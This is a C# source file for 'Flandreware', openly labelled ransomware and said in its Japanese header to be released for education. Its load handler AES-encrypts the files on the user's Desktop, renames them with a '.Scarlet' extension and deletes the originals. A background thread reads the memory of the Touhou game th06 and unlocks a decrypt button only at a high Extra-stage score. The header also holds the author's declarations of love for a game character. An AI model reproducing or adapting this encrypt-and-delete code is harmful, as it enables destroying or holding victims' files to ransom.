using System;
using System.Collections.Generic;
using System.ComponentModel;
/*
 * Software Name : Flandreware (ランサムウェア(Ransomware))
 * Created By : DarkNe$$$carlet
 * Created Program : 2021/12/25
 * Open source : 2025/01/12
 * github : https://github.com/zzScarletzz
 * youtube : https://www.youtube.com/@darknesscarlet
 * これはランサムウェアです。教育用にオープンソースにしました。私はレンセンウェアを見て、このフランドールウェアを作成しました。
 * 自分の人生でフランドールスカーレットは命より大事で大好きな彼女です。今の今まで、嫌いになったこともなければ、好きじゃなくなったことはありません。
 * 彼女こそ、私の人生の恋人です。フラン愛してる。
 * 
 * これは教育用に公開しています。ビルドしているのは、暗号化を細かくしています。ですが、このオープンソースでは、その機能は削除しています。
 * th06をインストールしてください。
 * extraステージ + スコア でファイルを解除できます。
 * そして、わざと、すべてを暗号化させていません。なぜなら、そうすると、日本ではウイルス所持罪になるからです。
 * 
 * 
 * 
*/

using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using static Flandreware.Crypto;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Media;

namespace Flandreware
{
    public partial class Form1 : Form
    {
        private Crypto CryptoFunctions = new Crypto();

        private bool mScorelimit = false;

        [DllImport("kernel32")]
        static extern bool ReadProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(int hProcess, int lpBaseAddress, byte[] lpBuffer, uint nSize, out uint nNumberOfBytesWritten);

        [DllImport("user32.dll")]
        private static extern bool SystemParametersInfo(uint uiAction, uint uiParam, StringBuilder pvParam, uint fWinIni);

        private const int LevelPtr = 0x69BCB0;
        private const int ScorePtr = 0x69BCA0;

        private const uint SPI_SETDESKWALLPAPER = 0x0014;
        private const uint SPIF_UPDATEINIFILE = 1;
        private const uint SPIF_SENDWININICHANGE = 2;
        int MAX_PATH = 260;


        private int handle;

        public Form1()
        {
           
            InitializeComponent();
            SoundPlayer audio = new SoundPlayer(Flandreware.Properties.Resources.tobeornottobe);
            audio.Play();
            MessageBox.Show("Can you die for someone?", "to be or not to be");
            MessageBox.Show("この先は、Flandreware(ランサムウェア)\nFlandreware (ransomware) beyond this point.", "Flandreware");
            MessageBox.Show("あなたはこの先を実行しますか？\nWill you run this destination?", "Flandreware");
            MessageBox.Show("[Flandre Scarlet]\n私と遊んでくれるの？\nWill you play with me?","Flandreware");
            MessageBox.Show("[Flandre Scarlet]\n私とゲームをするの？\nAre you playing games with me?", "Flandreware");
            new Thread(new ThreadStart(() =>
            {
                while (true)
                {
                    string ProcessName = "th06";
                    Process[] allProcesses = Process.GetProcessesByName(ProcessName);
                    if (allProcesses.Length == 0) Processlabel.Invoke((MethodInvoker)delegate
                     {
                         Processlabel.Text = "Not Process";
                     });

                    foreach (System.Diagnostics.Process p in allProcesses)
                    {
                        try
                        {
                            handle = (int)p.Handle;
                        }
                        catch
                        {
                            break;
                        }

                        string input = ScoreLabel.Text;
                        string[] bytestr = input.Split(',');
                        uint outvar;
                        var buffer = new byte[4];

                        Processlabel.Invoke(new MethodInvoker(() =>
                        {
                            Processlabel.Text = "Running";
                        }));
                        var readLevel = ReadProcessMemory(handle, LevelPtr, buffer, 4, out outvar);
                        if (!readLevel)
                        {
                            Processlabel.Invoke(new MethodInvoker(() =>
                            {
                                Console.Write("Hello Debuger User :");//
                                Processlabel.Text = "Process Killed!";
                            }));
                            break;
                        }
                        else if (BitConverter.ToInt32(buffer, 0) != 4)
                        {
                            Console.Write("Hello Debuger User :");
                            LevelLavel.Invoke(new MethodInvoker(() =>
                            {
                                Console.Write("Hello Debuger User :");//
                                LevelLavel.Text = "Not Extra";
                            }));
                        }
                        else
                        {
                            Processlabel.Invoke(new MethodInvoker(() =>
                            {
                                Console.Write("Hello Debuger User :");//
                                LevelLavel.Text = "Extra";
                            }));
                        }
                        Console.Write("Hello Debuger User :");//

                        var readScore = ReadProcessMemory(handle, ScorePtr, buffer, 4, out outvar);
                        if (!readScore)
                        {
                            ScoreLabel.Invoke(new MethodInvoker(() =>
                            {
                                Console.Write("Hello Debuger User :");//
                                ScoreLabel.Text = "Process Killed!";
                            }));
                            break;
                        }
                        Console.Write("Hello Debuger User :");//

                        if (mScorelimit)
                        {

                            break;
                        }


                        ScoreLabel.Invoke(new MethodInvoker(() =>
                        {
                            Console.Write("Hello Debuger User :");//
                            ScoreLabel.Text = (BitConverter.ToInt32(buffer, 0) * 10).ToString();
                            if (BitConverter.ToInt32(buffer, 0) > 20000000) // score 20,000,000
                                button3.Visible = true;
                            //mScorelimit = true;
                            else
                                buffer = null;

                        }));
                    }
                    Thread.Sleep(100);
                }
            })).Start();
        }

        private void label6_Click(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {

            Console.Write("Hello Debuger User :");//
            this.ControlBox = !this.ControlBox;
            string fullPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string fullPath1 = Path.GetFullPath("C:¥Users\\..\\");

            foreach (string file in Directory.GetFiles(fullPath))
            {
                FileInfo fileInfo = new FileInfo(file);
                float num = (float)fileInfo.Length / 1024f / 1024f;

                ListViewItem listViewItem = new ListViewItem(file);
                listViewItem.SubItems.Add(fileInfo.Extension);

                listViewItem.SubItems.Add(num.ToString());

                listViewItem.SubItems.Add("待機");
                this.listView1.Items.Add(listViewItem);

                Console.Write("Hello Debuger User :");//
            }

            for (int j = 0; j < this.listView1.Items.Count; j++)
            {
                try
                {
                    bool flag = this.listView1.Items[j].SubItems[1].Text == ".Scarlet";
                    if (!flag)
                    {
              
                        Console.Write("Hello Debuger User :");//
                        bool flag1 = PasswordTXT.Text != "";
                        if (flag1)
                        {
                        
                            Console.Write("Hello Debuger User :");//
                            bool flag2 = this.PasswordTXT.Text == this.PasswordTXT.Text;
                            if (flag2)
                            {
                                File.Copy(listView1.Items[j].SubItems[0].Text, listView1.Items[j].SubItems[0].Text + ".Scarlet"); //元のファイルのコピーを取得し、.Scarlet拡張子を付けて保存する
                                Console.Write("Hello Debuger User :");//

                                byte[] bytesToBeEncrypted = File.ReadAllBytes(this.listView1.Items[j].SubItems[0].Text ?? ".Scarlet");
                                Console.Write("Hello Debuger User :");//
                                byte[] array = Encoding.UTF8.GetBytes(this.PasswordTXT.Text);

                                Console.Write("Hello Debuger User :" );//

                                array = SHA256.Create().ComputeHash(array);
                                byte[] bytes = this.CryptoFunctions.AES_Encrypt(bytesToBeEncrypted, array);
                                string fileEncrypted1 = listView1.Items[j].SubItems[0].Text + ".Scarlet";

                              
                                Console.Write("Hello Debuger User :");//

                                File.WriteAllBytes(fileEncrypted1, bytes);
                                
                                File.Delete(listView1.Items[j].SubItems[0].Text);
                                this.listView1.Items[j].BackColor = Color.LimeGreen;
                            }
                            else
                            {
                   
                                Console.Write("Hello Debuger User :");//
                                MessageBox.Show("パスワードの確認が取れませんでした。");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.Write("Hello Debuger User :");//
                }
            }

            //SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, Bitmap, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
        }
        //score 0x0069BCA0 .. score th06e.exe+29BCA0



        private void button3_Click(object sender, EventArgs e)
        {
            Console.Write("Hello Debuger User :"    );//
            ManualDecrypt manual = new ManualDecrypt();
            manual.Show();
            Console.Write("Hello Debuger User :");//
        }

        private void button2_Click(object sender, EventArgs e)
        {

        }
    }
}



